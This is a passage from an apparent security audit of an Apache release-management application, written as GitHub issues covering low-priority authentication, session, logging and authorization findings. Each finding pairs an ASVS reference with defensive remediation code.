No remediation needed for this code. This finding will be automatically resolved by fixing ASVS-633-CRIT-002 (requiring MFA for admin access). Once admin sessions require MFA, impersonated sessions will correctly inherit mfa=True.

**Verification after ASVS-633-CRIT-002 is fixed:**
1. Verify admin must have MFA to access browse-as feature
2. Verify impersonated session has mfa=True
3. Add test: admin with MFA creates impersonated session → mfa=True
4. Add test: attempt to bypass MFA via impersonation → fails

### Acceptance Criteria
- [ ] Wait for ASVS-633-CRIT-002 remediation
- [ ] Verify MFA properly flows through impersonation after fix
- [ ] Add tests confirming MFA inheritance

### References
- Source reports: L2:6.3.3.md
- Related findings: ASVS-633-CRIT-002
- ASVS sections: 6.3.3

### Priority
Low

---

## Issue: FINDING-411 - Undocumented Public API Endpoints Beyond Authorization Documentation

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The authorization documentation explicitly lists 6 API endpoints as 'intentionally unauthenticated,' but at least 10 additional API endpoints lack authentication and are not documented as intentionally public. Auditors reviewing documentation would believe only 6 endpoints are public, creating false confidence about attack surface. The /api/tasks/list endpoint may expose internal operational details including error messages that could aid reconnaissance.

### Details
Undocumented unauthenticated endpoints include:
- /api/tasks/list
- /api/users/list
- /api/releases/list
- /api/projects/list
- /api/committees/list
- /api/committee/get/<name>
- /api/committee/keys/<name>
- /api/committee/projects/<name>
- /api/project/get/<project>
- /api/project/releases/<project>
- /api/release/get/<project>/<version>
- /api/policy/get/<project>
- /api/ignore/list/<project>

### Recommended Remediation
**Option 1 (Document):** Document all intentionally public endpoints in authorization-security.md with categorization:

```markdown
## Intentionally Unauthenticated API Endpoints

### Release Information (Public)
- GET /api/releases/list - List all releases with pagination
- GET /api/release/get/<project>/<version> - Get release details

### Project/Committee Information (Public)
- GET /api/projects/list - List all projects
- GET /api/committees/list - List all committees
- GET /api/committee/get/<name> - Get committee details
- GET /api/committee/keys/<name> - Get committee signing keys
- GET /api/committee/projects/<name> - Get projects for committee
- GET /api/project/get/<project> - Get project details
- GET /api/project/releases/<project> - Get releases for project

### Configuration (Public)
- GET /api/policy/get/<project> - Get release policy
- GET /api/ignore/list/<project> - Get ignore patterns

### Task Status (Public - Transparency)
- GET /api/tasks/list - List background tasks

### User/Key Information (Public)
- GET /api/users/list - List users (public directory)
```

**Option 2 (Add authentication):** Add authentication to endpoints that should be restricted by adding @jwtoken.require decorator to routes like /api/tasks/list.

### Acceptance Criteria
- [ ] Choose option: document or add authentication
- [ ] If documenting, update authorization-security.md
- [ ] If adding auth, add @jwtoken.require decorators
- [ ] Verify complete list of public endpoints
- [ ] Review /api/tasks/list for information disclosure

### References
- Source reports: L2:6.3.4.md
- ASVS sections: 6.3.4

### Priority
Low

---

## Issue: FINDING-412 - JWT TTL Documentation Discrepancy (9.2.2)

**Labels:** bug, security, priority:low, asvs-level:L1, asvs-level:L2

**ASVS Level(s):** L1, L2

**Description:**

### Summary
Documentation states JWT validity is '90 minutes,' but code sets TTL to 30 minutes (_ATR_JWT_TTL = 30 * 60). Actual behavior is more restrictive than documented (30 min vs 90 min), so not a security weakness. However, discrepancy could confuse API consumers expecting 90-minute tokens, lead to unnecessary token refresh logic, and create false assumptions during security audits.

### Details
- Documentation: `atr/docs/authentication-security.md` states "90 minutes"
- Implementation: `atr/jwtoken.py` line 38 defines `_ATR_JWT_TTL = 30 * 60`

### Recommended Remediation
**Option 1 (Recommended):** Update documentation to match code:
```markdown
* **Validity**: 30 minutes from creation
```

**Option 2:** If 90 minutes is the intended policy, update code:
```python
_ATR_JWT_TTL: Final[int] = 90 * 60  # 90 minutes
```

**Verification:** Review and align all documentation references to token lifetime, including API documentation, user guides, and inline code comments.

### Acceptance Criteria
- [ ] Choose option 1 or 2
- [ ] Update documentation or code to match
- [ ] Search for all "90 min" references and update
- [ ] Verify consistency across all documentation

### References
- Source reports: L1:9.1.2.md, L2:9.2.2.md
- ASVS sections: 9.1.2, 9.2.2
- CWE: CWE-1188

### Priority
Low

---

## Issue: FINDING-413 - PAT-to-JWT Exchange Does Not Verify MFA Status

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The PAT-to-JWT exchange endpoint validates PAT authenticity and LDAP account status but does not verify MFA status. This means a compromised PAT can be used to obtain JWTs without MFA verification. If a PAT is compromised, an attacker can obtain JWTs and perform all API operations authorized to the PAT owner, regardless of whether the owner has MFA enabled. The 180-day PAT validity window creates a significant exposure period. However, this is a common and accepted pattern for API tokens (similar to GitHub, GitLab, etc.).

### Details
In `atr/storage/writers/tokens.py` at lines 87-109 and `atr/api/__init__.py` in the `jwt_create()` function, PAT-to-JWT exchange does not check MFA status.

### Recommended Remediation
Document the intentional MFA trade-off for PAT-based API access in the security documentation. If policy requires MFA enforcement, consider:

**Option 1: Store MFA status at PAT creation time:**
```python
class PersonalAccessToken(SQLModel):
    # ... existing fields ...
    mfa_verified_at_creation: bool = False
```

**Option 2:** Require periodic re-authentication for sensitive API operations.

**Note:** This is a design decision with compensating controls (rate limiting, LDAP status checks, revocation capabilities) already in place.

### Acceptance Criteria
- [ ] Document PAT MFA trade-off in security documentation
- [ ] If implementing MFA enforcement, choose option 1 or 2
- [ ] Add tests for chosen approach
- [ ] Update API documentation with MFA implications

### References
- Source reports: L2:6.4.3.md
- Related findings: ASVS-643-MED-001
- ASVS sections: 6.4.3

### Priority
Low

---

## Issue: FINDING-414 - Unverified JWT Claims Used for Post-Verification Authorization Checks

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The JWT verification function performs two decodes of the same token: an unverified decode and a verified decode. Post-verification authorization checks (LDAP status, type validation) reference the unverified claims_unsafe['sub'] instead of the verified claims['sub']. While not currently exploitable due to execution order, this violates defense-in-depth principles and could become vulnerable if future PyJWT vulnerabilities produce divergent payloads between verified/unverified decodes.

### Details
In `atr/jwtoken.py` at lines 115-147, the function:
1. Performs unverified decode to get claims_unsafe
2. Performs verified decode to get claims
3. Uses claims_unsafe['sub'] for post-verification security checks

### Recommended Remediation
Use verified claims consistently throughout the function:

```python
async def verify(token: str) -> str:
    # Perform verified decode first
    claims = jwt.decode(
        token,
        jwt_secret_key,
        algorithms=[_ALGORITHM],
        issuer=_ATR_JWT_ISSUER,
        audience=_ATR_JWT_AUDIENCE,
        options={"require": ["sub", "iss", "aud", "iat", "nbf", "exp", "jti"]},
    )
    
    # Extract subject from VERIFIED claims
    asf_uid = claims.get("sub")
    
    # Set logging context (can use unverified for logging if needed)
    log.set_asf_uid(asf_uid)
    
    # Use verified claims for security checks
    if not isinstance(asf_uid, str):
        raise ASFQuartException("Invalid subject type")
    
    if not await ldap.is_active(asf_uid):
        raise ASFQuartException("Account disabled")
    
    return asf_uid
```

Keep unverified decode only for logging purposes if needed, but use verified claims for all security decisions.

### Acceptance Criteria
- [ ] Replace all references to claims_unsafe['sub'] with claims['sub']
- [ ] Use verified claims for all security-relevant operations
- [ ] Keep unverified decode only for pre-verification logging if needed
- [ ] Unit tests verifying security checks use verified data

### References
- Source reports: L1:7.2.1.md
- ASVS sections: 7.2.1

### Priority
Low

---

## Issue: FINDING-415 - Bearer Token Value Logged to Standard Output

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
When a bearer token is presented but no token_handler is registered, the code prints the full token value to stdout. This appears to be debug code that was never removed. Raw bearer tokens exposed in logs could enable replay attacks by anyone with log access. However, this is currently a dead code path as ATR registers JWT verification as the token handler in production, so the else branch is never executed.

### Details
In `src/asfquart/session.py` at line 88, debug code prints raw bearer tokens:

```python
else:
    print(f"Bearer token: {bearer_token}")  # Logs full token!
```

### Recommended Remediation
Remove token value from log statement:

```python
# Replace line 88
else:
    log.warning('Bearer token presented but no handler registered')
```

Or use proper structured logging without including the token value:

```python
else:
    logging.getLogger(__name__).debug(
        'No PAT handler registered for bearer token authentication'
    )
```

**Best practice:** Remove debug code entirely in production.

### Acceptance Criteria
- [ ] Remove or redact bearer token from log statement
- [ ] Use proper logging framework instead of print()
- [ ] Verify no token values appear in logs
- [ ] Search codebase for similar debug print statements

### References
- Source reports: L1:7.2.1.md
- ASVS sections: 7.2.1

### Priority
Low

---

## Issue: FINDING-416 - PAT Validation Exceptions Return HTTP 500 Instead of 401

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
Failed PAT validation raises ASFQuartException without specifying errorcode, defaulting to HTTP 500 (Internal Server Error) instead of 401 (Unauthorized). This affects three validation points: invalid PAT hash, user mismatch, and expired PAT. While verification still occurs correctly on the backend, API consumers and monitoring systems misinterpret authentication failures as server errors.

### Details
In `atr/jwtoken.py` at lines 134-143, three PAT validation failures raise exceptions without errorcode:
- Invalid PAT hash → HTTP 500 (should be 401)
- User mismatch → HTTP 500 (should be 401)
- Expired PAT → HTTP 500 (should be 401)

### Recommended Remediation
Add errorcode=401 to all PAT validation exceptions:

```python
# Line ~136 - Invalid hash
raise ASFQuartException('Personal Access Token invalid', errorcode=401)

# Line ~139 - User mismatch
raise ASFQuartException(
    f'Personal Access Token does not belong to {asf_uid}',
    errorcode=401
)

# Line ~143 - Expired
raise ASFQuartException('Personal Access Token expired', errorcode=401)
```

### Acceptance Criteria
- [ ] Add errorcode=401 to invalid PAT hash exception
- [ ] Add errorcode=401 to user mismatch exception
- [ ] Add errorcode=401 to expired PAT exception
- [ ] Verify HTTP 401 returned for authentication failures
- [ ] Update API documentation with correct status codes

### References
- Source reports: L1:7.2.1.md
- ASVS sections: 7.2.1

### Priority
Low

---

## Issue: FINDING-417 - SSH Authentication Success Not Logged

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The SSH authentication handler (SSHServer.validate_public_key) logs some failure cases but does not log successful authentications or missing workflow key lookups. The function properly logs invalid usernames (public_key_invalid) and expired keys (public_key_expired), and sets authentication context with log.set_asf_uid(), but when workflow key is not found in database or authentication succeeds, no log entry is created. This creates an incomplete audit trail for automated GitHub workflow authentication.

### Details
In `atr/ssh.py` at lines 97-122:
- Logs invalid usernames
- Logs expired keys
- Does NOT log missing workflow keys
- Does NOT log successful authentication

### Recommended Remediation
Add logging for both success and missing key scenarios:

```python
async def validate_public_key(self, username: str, public_key: asyncssh.SSHKey) -> bool:
    # ... existing code ...
    
    # Add logging for missing key
    if workflow_key is None:
        log.failed_authentication(
            'workflow_key_not_found',
            extra={'fingerprint': fingerprint}
        )
        return False
    
    # ... existing validation ...
    
    # Add logging before return True
    log.info(
        'ssh_auth_success',
        extra={
            'username': username,
            'fingerprint': fingerprint,
            'asf_uid': self._github_asf_uid
        }
    )
    return True
```

### Acceptance Criteria
- [ ] Add logging for missing workflow key scenario
- [ ] Add logging for successful SSH authentication
- [ ] Verify complete audit trail for SSH auth
- [ ] Test log output for all SSH auth paths

### References
- Source reports: L1:7.2.2.md
- ASVS sections: 7.2.2
- CWE: CWE-778

### Priority
Low

---

## Issue: FINDING-418 - PAT Creation Not Audit-Logged (Inconsistency)

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
PAT creation (add_token() in atr/storage/writers/tokens.py:48-71) sends an email notification to the user but does not write an entry to the audit log. This creates an inconsistency with PAT deletion and JWT issuance operations, which are properly audit-logged using append_to_audit_log(). While email notification provides user-level audit trail, the audit log should contain complete PAT lifecycle events for forensic purposes.

### Details
- `add_token()` at lines 48-71: Sends email, NO audit log entry
- `delete_token()`: Properly calls append_to_audit_log() with action='token_deleted'
- JWT issuance: Properly calls append_to_audit_log()

### Recommended Remediation
Add audit logging to match deletion behavior:

```python
async def add_token(self, label: str, expires: datetime.datetime) -> str:
    # ... existing code ...
    
    await self.__data.commit()
    
    # Add audit logging BEFORE sending email
    self.__write_as.append_to_audit_log(
        asf_uid=self.__asf_uid,
        token_id=pat.id,
        action='token_created',
        label=label,
        expires=expires.isoformat()
    )
    
    # ... continue with email notification ...
```

This achieves consistency with delete_token() which properly logs to audit.

### Acceptance Criteria
- [ ] Add append_to_audit_log() call to add_token()
- [ ] Include token_id, label, and expiration in log entry
- [ ] Verify audit log entry created for PAT creation
- [ ] Maintain email notification functionality

### References
- Source reports: L1:7.2.2.md
- Related findings: ASVS-722-MED-003
- ASVS sections: 7.2.2
- CWE: CWE-778

### Priority
Low

---

## Issue: FINDING-419 - No Server-Side Session Invalidation Capability

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The application uses Quart's cookie-based session model where session state is stored entirely in the client's signed cookie. There is no server-side session store, which means: (1) Old session cookies cannot be invalidated server-side, (2) No ability to immediately revoke all sessions for a user (e.g., on password change or suspected compromise), (3) Captured cookies remain valid until expiry, even after logout. This is an architectural limitation inherent to cookie-based session design.

### Details
In `src/asfquart/session.py` (entire module), the session management uses client-side cookies with no server-side session store.

### Recommended Remediation
Priority: LOW - This is an architectural trade-off inherent to cookie-based sessions. If server-side invalidation becomes a requirement:

**Option 1 (Add Session ID Tracking):** 
Store session IDs in Redis/database, check validity on each request, enabling immediate invalidation:

```python
async def validate_session(session_id: str) -> bool:
    # Check if session_id exists in Redis
    return await redis.exists(f"session:{session_id}")

# In middleware
if not await validate_session(session.id):
    await logout()
```

**Option 2 (Add 'Not Before' Timestamp):** 
Include user.last_password_change in session and reject sessions issued before that timestamp:

```python
# In session validation
if session.issued_at < user.last_password_change:
    await logout()  # Invalidate old sessions
```

**Current Recommendation:** Address ASVS-724-MED-001 first. This architectural limitation can be revisited if business requirements change.

### Acceptance Criteria
- [ ] Document architectural decision and trade-offs
- [ ] If implementing session store, choose option 1 or 2
- [ ] Add tests for server-side invalidation if implemented
- [ ] Update security documentation

### References
- Source reports: L1:7.2.4.md
- Related findings: ASVS-724-MED-001
- ASVS sections: 7.2.4

### Priority
Low

---

## Issue: FINDING-420 - Utility Function get_asf_id_or_die() Bypasses LDAP Account Status Check

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The `get_asf_id_or_die()` utility function validates session existence but does not verify LDAP account status. This function is referenced in the summary as validating session existence but not LDAP account status, creating a potential bypass vector for utility functions that may be used in various parts of the codebase without proper authentication checks.

### Details
In `atr/util.py`, the `get_asf_id_or_die()` function checks for session but not LDAP active status. This creates a gap where disabled accounts could still access functionality if code paths use this utility instead of full `authenticate()`.

### Recommended Remediation
Update `get_asf_id_or_die()` to include LDAP account status validation:

```python
async def get_asf_id_or_die() -> str:
    """Get ASF user ID from session, or raise 401.
    
    Validates session existence and LDAP account active status.
    """
    session = await quart.session.get('atr_session')
    if not session:
        raise ASFQuartException('Authentication required', errorcode=401)
    
    asf_uid = session.get('asf_uid')
    if not asf_uid:
        raise ASFQuartException('Invalid session', errorcode=401)
    
    # Add LDAP status check
    if not await ldap.is_active(asf_uid):
        raise ASFQuartException('Account disabled', errorcode=401)
    
    return asf_uid
```

Alternatively, ensure this utility function is only used in contexts where `authenticate()` has already been called. Add documentation clarifying the security properties of this function and when it should be used.

### Acceptance Criteria
- [ ] Add LDAP account status check to get_asf_id_or_die()
- [ ] OR document that function requires prior authenticate() call
- [ ] Audit all callers to verify proper authentication
- [ ] Unit tests for disabled account handling

### References
- Source reports: L1:7.4.1.md
- Related findings: ASVS-741-MED-002B
- ASVS sections: 7.4.1
- CWE: CWE-287

### Priority
Low

---

## Issue: FINDING-421 - No Session Termination After OpenPGP Key Changes

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
When a user removes an OpenPGP key, no option is presented to terminate other active sessions. While OpenPGP keys are primarily for signing/encryption rather than authentication, their management should still offer session termination for consistency with other authentication factor changes. This is a completeness issue rather than a critical security gap, as OpenPGP keys are not directly used for authentication in this application.

### Details
In `atr/post/keys.py` at lines 161-171, the `_delete_openpgp_key()` handler lacks session termination option that exists for PAT and SSH key operations.

### Recommended Remediation
Add 'terminate_other_sessions' boolean field to DeleteOpenPGPKeyForm for consistency:

```python
class DeleteOpenPGPKeyForm(pydantic.BaseModel):
    fingerprint: str
    terminate_other_sessions: bool = False  # Add field

async def _delete_openpgp_key(form: DeleteOpenPGPKeyForm) -> str:
    # ... existing key deletion code ...
    
    # Add session termination check
    if form.terminate_other_sessions:
        current_session_id = session.id
        await terminate_all_other_sessions(session.asf_uid, current_session_id)
        await quart.flash(
            "OpenPGP key deleted and all other sessions terminated",
            "success"
        )
    else:
        await quart.flash("OpenPGP key deleted", "success")
    
    # ... continue ...
```

Update OpenPGP key deletion form to add checkbox:
```html
<input type="checkbox" name="terminate_other_sessions" id="terminate_other_sessions">
<label for="terminate_other_sessions">
    Also terminate all other active sessions
</label>
```

### Acceptance Criteria
- [ ] Add terminate_other_sessions field to DeleteOpenPGPKeyForm
- [ ] Update _delete_openpgp_key() handler with termination logic
- [ ] Add checkbox to OpenPGP key deletion form
- [ ] Update success message based on checkbox selection
- [ ] Unit tests for session termination on key deletion

### References
- Source reports: L2:7.4.3.md
- Related findings: ASVS-743-CRITICAL-001, ASVS-743-MEDIUM-002
- ASVS sections: 7.4.3

### Priority
Low

---

## Issue: FINDING-422 - Admin Plain-Text Endpoints Lack Logout Functionality

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
Six admin diagnostic endpoints (configuration, consistency, env, keys_check_post, keys_regenerate_all_post, logs) return text/plain responses with no HTML structure and therefore no logout button. Authenticated admins viewing these pages must use browser back button, navigate to another URL, or manually visit /auth?logout to terminate sessions. Impact is limited as these are diagnostic endpoints for technically sophisticated admin users, sessions still have timeout enforcement, and the admin user base is small.

### Details
In `atr/admin/__init__.py`, the following endpoints return text/plain:
- Line 206: configuration
- Line 250: consistency
- Line 430: env
- Line 453: keys_check_post
- Line 490: keys_regenerate_all_post
- Line 588: logs

### Recommended Remediation
**Option 1 (Recommended for compliance):** Wrap text output in HTML using template.render() with admin/text-display.html that extends base.html:

```python
# Create templates/admin/text-display.html
{% extends "base.html" %}
{% block content %}
<div class="admin-text-output">
    <pre>{{ text_content }}</pre>
</div>
{% endblock %}

# Update endpoints to use template
@app.route("/admin/configuration")
async def configuration():
    text = generate_configuration_text()
    return await template.render(
        "admin/text-display.html",
        text_content=text
    )
```

**Option 2 (Alternative):** Accept as documented limitation and add to documentation:

```markdown
## Admin Diagnostic Endpoints

The following admin diagnostic endpoints return plain text for machine readability 
and do not include logout buttons:
- /admin/configuration
- /admin/consistency
- /admin/env
- /admin/keys/check
- /admin/keys/regenerate
- /admin/logs

To logout after viewing these endpoints, use browser navigation or visit 
/auth?logout directly.
```

### Acceptance Criteria
- [ ] Choose option 1 (wrap in HTML) or option 2 (document limitation)
- [ ] If option 1, create text-display template
- [ ] If option 1, update all six endpoints
- [ ] If option 2, add documentation
- [ ] Verify logout button appears on HTML-wrapped pages

### References
- Source reports: L2:7.4.4.md
- ASVS sections: 7.4.4
- CWE: CWE-1059

### Priority
Low

---

## Issue: FINDING-423 - No "Revoke All Tokens for ALL Users" Capability

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The admin can revoke PATs for a single user at a time via `revoke_all_user_tokens()`. In a security incident affecting all users (e.g., PAT hash algorithm weakness), there's no single action to revoke all PATs for all users. The JWT key rotation covers JWTs but PATs themselves remain valid (and could be exchanged for new JWTs after key rotation). In a mass security incident, admin must individually revoke tokens for each user shown on the revoke page, which is slow and error-prone.

### Details
In `atr/storage/writers/tokens.py` at line 163, only `revoke_all_user_tokens()` exists (single user). No `revoke_all_tokens_globally()` capability in `atr/admin/__init__.py`.

### Recommended Remediation
Add a `revoke_all_tokens_globally()` method to atr/storage/writers/tokens.py:

```python
# atr/storage/writers/tokens.py
async def revoke_all_tokens_globally(self) -> int:
    """Revoke all PATs for all users. Returns count of revoked tokens.
    
    Use only in mass security incidents.
    """
    # Query all PATs
    tokens = await self.__data.execute(
        select(PersonalAccessToken)
    )
    
    count = len(tokens)
    
    # Delete all
    for token in tokens:
        await self.__data.delete(token)
    
    await self.__data.commit()
    
    # Log to audit
    self.__write_as.append_to_audit_log(
        action='tokens_revoked_globally',
        count=count,
        reason='mass_security_incident'
    )
    
    return count
```

Add corresponding admin route:

```python
# atr/admin/__init__.py
class RevokeAllTokensGloballyForm(pydantic.BaseModel):
    confirmation: str

@app.route("/admin/tokens/revoke-all", methods=["POST"])
@authenticate(admin=True)
async def revoke_all_tokens_globally_post():
    form = await parse_form(RevokeAllTokensGloballyForm)
    
    if form.confirmation != "REVOKE ALL TOKENS":
        await quart.flash("Invalid confirmation", "error")
        return quart.redirect("/admin/tokens")
    
    async with storage.write(session.asf_uid) as write:
        count = await write.as_committee_admin().revoke_all_tokens_globally()
    
    await quart.flash(
        f"Revoked {count} tokens for all users",
        "success"
    )
    return quart.redirect("/admin/tokens")
```

### Acceptance Criteria
- [ ] Add revoke_all_tokens_globally() method
- [ ] Add admin route with confirmation requirement
- [ ] Require "REVOKE ALL TOKENS" confirmation string
- [ ] Log global revocation to audit log
- [ ] Add unit tests for global revocation
- [ ] Document use case in admin documentation

### References
- Source reports: L2:7.4.5.md
- ASVS sections: 7.4.5

### Priority
Low

---

## Issue: FINDING-424 - No Comprehensive Endpoint-to-Authorization Mapping

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
While authorization rules are well-defined by operation category (releases, tokens, etc.), there is no comprehensive mapping of HTTP endpoints to their specific authorization requirements. This makes it difficult to verify complete authorization coverage during audits, understand authorization requirements when reviewing routes, ensure consistent authorization across similar endpoints, and onboard new developers to the authorization model.

### Details
Authorization documentation is organized by operation type rather than by HTTP endpoint. Auditors must trace through code to determine which authorization checks apply to specific endpoints.

### Recommended Remediation
Create `atr/docs/authorization-matrix.md` with comprehensive mapping:

```markdown
# Authorization Matrix

## Web Endpoints

### Public (No Authentication)
| Method | Path | Description |
|--------|------|-------------|
| GET | / | Homepage |
| GET | /projects | Project directory |

### Authenticated (Foundation Committer)
| Method | Path | Auth | Authorization | Additional Validation |
|--------|------|------|---------------|----------------------|
| POST | /tokens/create | JWT | FoundationCommitter | Rate limit: 10/hour |
| DELETE | /tokens/delete | JWT | Token owner only | Audit logged |

### Admin Only
| Method | Path | Auth | Authorization | Phase Restrictions |
|--------|------|------|---------------|-------------------|
| POST | /admin/release/delete | OAuth+MFA | CommitteeAdmin | Any phase |

## API Endpoints

### Token Management
| Method | Path | Auth | Authorization | Rate Limit |
|--------|------|------|---------------|-----------|
| POST | /api/jwt/create | PAT | FoundationCommitter | 500/hour |

### Release Management
| Method | Path | Auth | Authorization | Phase | Rate Limit |
|--------|------|------|---------------|-------|-----------|
| POST | /api/release/create | JWT | CommitteeMember | Compose | 10/hour |

## Authorization Legend
- **FoundationCommitter**: Any ASF committer with active LDAP account
- **CommitteeMember**: Member of project's PMC
- **CommitteeAdmin**: Admin privileges on committee
- **TokenOwner**: User who created the token

## Enforcement Layers
1. Authentication: @authenticate() decorator or @jwtoken.require
2. LDAP Status: ldap.is_active() check
3. Authorization: storage.write_as_*() context managers
4. Phase Restrictions: Checked in storage layer
5. Rate Limiting: @rate_limiter.rate_limit() decorator

## Known Gaps
See security findings:
- FINDING-XXX: Missing authorization check on endpoint Y
```

Generate authorization matrix as part of CI/CD pipeline to keep synchronized with code.

### Acceptance Criteria
- [ ] Create atr/docs/authorization-matrix.md
- [ ] Document all HTTP endpoints with authorization requirements
- [ ] Include authentication, authorization, rate limits, phase restrictions
- [ ] Add authorization legend explaining levels
- [ ] Document enforcement layers and mechanisms
- [ ] List known gaps with references to security findings
- [ ] Consider automating matrix generation in CI/CD

### References
- Source reports: L1:8.1.1.md
- Related findings: ASVS-811-HIGH-001, ASVS-811-HIGH-002, ASVS-811-MED-001, ASVS-811-MED-002
- ASVS sections: 8.1.1

### Priority
Low

---

## Issue: FINDING-425 - Admin Route Uses Insufficient Authorization Context for Storage Layer

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The admin route for regenerating KEYS files across all committees uses `as_committee_member_outcome()` instead of `as_committee_admin_outcome()`, causing the operation to silently skip committees where the admin is not a PMC member. This undermines the admin's ability to perform security-critical operations across all committees and provides no error indication of incomplete operations.

### Details
In `atr/admin/__init__.py` at line 411, the keys regeneration route uses:
```python
write.as_committee_member_outcome(committee_key)  # Wrong - should be admin
```

This should match the pattern used in other admin routes like `delete_release_post` at line 180 which properly uses `as_committee_admin_outcome()`.

### Recommended Remediation
Replace `write.as_committee_member_outcome(committee_key)` with `write.as_committee_admin_outcome(committee_key)`:

```python
@app.route("/admin/keys/regenerate-all", methods=["POST"])
@authenticate(admin=True)
async def keys_regenerate_all_post():
    outcomes = []
    
    async with storage.write(session.asf_uid) as write:
        for committee_key in all_committees:
            # Use admin authorization, not member
            outcome = await write.as_committee_admin_outcome(committee_key).regenerate_keys()
            outcomes.append(outcome)
    
    # Report any authorization failures instead of silently skipping
    failures = [o for o in outcomes if not o.success]
    if failures:
        await quart.flash(
            f"Failed to regenerate keys for {len(failures)} committees",
            "error"
        )
```

### Acceptance Criteria
- [ ] Replace as_committee_member_outcome() with as_committee_admin_outcome()
- [ ] Report authorization failures instead of silently skipping
- [ ] Verify admin can regenerate keys for all committees
- [ ] Unit test for authorization level

### References
- Source reports: L1:8.2.1.md
- ASVS sections: 8.2.1

### Priority
Low

---

## Issue: FINDING-426 - SSH Server Missing LDAP Account Active Status Verification

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The SSH server authenticates users based on SSH keys stored in the database but never verifies that the user's LDAP account is active. This allows disabled accounts to continue accessing the system via SSH, creating a divergence from the web authentication path which properly checks ldap.is_active(). SSH read operations have no LDAP check, while write operations rely on a 600s principal cache that may be stale.

### Details
In `atr/ssh.py`:
- Line 206: Read operations (download) have no LDAP check
- Line 303: Write operations (upload) rely on cached principal
- Line 345: Other operations lack LDAP verification

### Recommended Remediation
Add LDAP active status check in `_step_02_handle_safely()` immediately after retrieving the asf_uid and before processing any commands:

```python
async def _step_02_handle_safely(self, conn: asyncssh.SSHServerConnection):
    """Handle SSH connection safely with proper authentication checks."""
    asf_uid = self._github_asf_uid  # Retrieved during authentication
    
    # Add LDAP active status check
    if not await ldap.is_active(asf_uid):
        log.failed_authentication(
            'ldap_account_inactive',
            extra={'asf_uid': asf_uid}
        )
        raise asyncssh.ChannelOpenError(
            asyncssh.OPEN_ADMINISTRATIVELY_PROHIBITED,
            "Account disabled"
        )
    
    # ... continue with command processing ...
```

Use the same `ldap.is_active()` check that the web path implements in blueprints/common.py:56-62.

**Note:** This issue is tracked in GitHub issue #737.

### Acceptance Criteria
- [ ] Add ldap.is_active() check in SSH handler
- [ ] Check occurs before any command processing
- [ ] Log and reject connections for disabled accounts
- [ ] Unit tests for disabled account SSH access
- [ ] Integration test with disabled LDAP account

### References
- Source reports: L1:8.2.1.md
- ASVS sections: 8.2.1

### Priority
Low

---

## Issue: FINDING-427 - Admin Database Operations Bypass Storage Layer Authorization and Audit

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The admin endpoint for deleting all keys associated with a committee performs direct database operations instead of using the storage layer. This bypasses the storage layer's authorization re-verification and audit logging, creating an inconsistency with other admin operations and violating the centralized audit logging principle.

### Details
In `atr/admin/__init__.py` at line 225, the `delete_committee_keys_post()` function performs direct database manipulation:
```python
committee.public_signing_keys.clear()  # Direct DB access, no audit
```

This contrasts with other admin operations like `revoke_user_tokens_post` which properly use the storage layer and generate audit logs.

### Recommended Remediation
Create a `delete_all_committee_keys()` method in the WriteAsCommitteeAdmin class:

```python
# atr/storage/writers/keys.py
class WriteAsCommitteeAdmin:
    async def delete_all_committee_keys(self, committee_key: str) -> int:
        """Delete all keys for a committee. Returns count of deleted keys."""
        committee = await self.__data.get_committee(committee_key)
        
        count = len(committee.public_signing_keys)
        
        # Delete via storage layer
        committee.public_signing_keys.clear()
        
        # Delete orphaned keys
        orphaned = await self.__data.query_orphaned_keys()
        for key in orphaned:
            await self.__data.delete(key)
        
        await self.__data.commit()
        
        # Audit log
        self.__write_as.append_to_audit_log(
            action='committee_keys_deleted',
            committee_key=committee_key,
            count=count
        )
        
        return count
```

Refactor `delete_committee_keys_post()` to use it:

```python
@app.route("/admin/committee/keys/delete", methods=["POST"])
@authenticate(admin=True)
async def delete_committee_keys_post():
    async with storage.write(session.asf_uid) as write:
        count = await write.as_committee_admin(committee_key).delete_all_committee_keys()
    
    await quart.flash(f"Deleted {count} keys", "success")
```

### Acceptance Criteria
- [ ] Create delete_all_committee_keys() in storage layer
- [ ] Refactor admin route to use storage layer method
- [ ] Verify audit log entries are created
- [ ] Verify authorization re-verification occurs
- [ ] Unit tests for storage layer method

### References
- Source reports: L1:8.2.1.md
- ASVS sections: 8.2.1

### Priority
Low

---

## Issue: FINDING-428 - Worker Does Not Re-Verify Data-Level Authorization at Task Execution

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
Background worker tasks do not re-verify project-level authorization at task execution time. Tasks are queued with authorization checks at enqueue time, but there is no re-verification when the task executes (which may be minutes or hours later). This creates a TOCTOU (Time-of-Check Time-of-Use) gap where user permissions could change between task creation and execution.

### Details
In `atr/worker.py` at line 249, the `_task_process()` function only checks user ban status, not full committee/project membership that may have changed since task was queued.

### Recommended Remediation
Add project-level authorization re-verification in the `_task_process()` function before executing task operations:

```python
async def _task_process(task: Task):
    """Process a background task with authorization re-verification."""
    # Existing ban check
    if user_is_banned(task.asf_uid):
        fail_task(task, "User banned")
        return
    
    # Add project/committee authorization re-verification
